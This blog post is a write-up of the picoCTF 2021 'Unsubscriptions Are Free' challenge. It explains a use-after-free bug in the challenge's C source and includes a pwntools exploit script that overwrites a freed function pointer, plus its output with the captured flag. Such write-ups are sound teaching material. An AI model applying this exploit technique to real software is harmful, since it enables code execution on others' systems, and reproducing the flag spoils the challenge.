---
layout: post
title: Use after free - picoCTF 2021 Unsubscriptions Are Free
tags: [CTF, pwn]
---
> Check out my new video-game and spaghetti-eating streaming channel on Twixer! [program](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln) and get a flag. [source](https://mercury.picoctf.net/static/95f0b63e520ae2beece2ca11235808f8/vuln.c)

Take a look at the source code. `main` function has a `print -> set -> run` pattern. The `processInput` function sets what to do for the next iteration and the `doProcess` function excutes it. `user` is a global pointer pointing to a `cmd` structure. The following are some code snippets
```c
typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

There are some suspicious things in the source. First is this `hahaexploitgobrrr` function which isn't called anywhere but address printed in the `S` operation.
```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}
```

Also the `I` operation `free`s the `user` object, but it may be invoked multiple times?
```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```
```
❯ ./vuln
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
i
You're leaving already(Y/N)?
y
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
i
You're leaving already(Y/N)?
y
Bye!
free(): double free detected in tcache 2
[1]    38303 IOT instruction (core dumped)  ./vuln
```
And since `doProcess` will always run, this could be a **Use-After-Free** condition.

## Use-After-Free
So normally after a `free`, the `free`d memory is sort of "stored" in tcache. The next `malloc` will try to allocate memory from it if possible. The content isn't wiped and that's what happened during [Cache Me Outside](https://nickchen120235.github.io/2022/04/09/cache-me-outside.html). But the problem in the use-after-free case is that some memory is `free`d, but a pointer doesn't know whether the memory it's pointing to is valid or not. It is the heap manager who knows whether a `free` operation can be done. Exploiting UAF requires a `malloc` after `free`, modify the memory, and access through the original pointer (remember pointer is how a program interpres a chunk of memory).

## Attack
There is a `malloc` we can use, the `L` operation. It `malloc`s 8 bytes of memory and reads user input, and after that `doProcess` is invoked.
```c
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```
So the target is to write `hahaexploitgobrrr`'s memory to the first member of `cmd`. And since `vuln` is compiled with `NO PIE`, the address we found locally could also be used in remote environment.

The final exploitation script is the following, it `free`s `user` by `I` then modify it by `L`, which will then execute `hahaexploitgobrrr` because of `doProcess`.
```python
from pwn import *

# p = process("./vuln")
p = remote("mercury.picoctf.net", 58574)

p.sendline(b"i")
p.sendline(b"y")

p.sendline(b"l")
sleep(1)
p.sendline(p64(0x80487d6))

p.interactive()
```
```
❯ python3 ./solve.py
[+] Opening connection to mercury.picoctf.net on port 58574: Done
[*] Switching to interactive mode
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
You're leaving already(Y/N)?
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
I only read premium member messages but you can 
try anyways:
picoCTF{d0ubl3_j30p4rdy_ec42c6fc}
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
```

## Reference
- [https://papadoxie.github.io/Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree.html](https://papadoxie.github.io/Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree.html)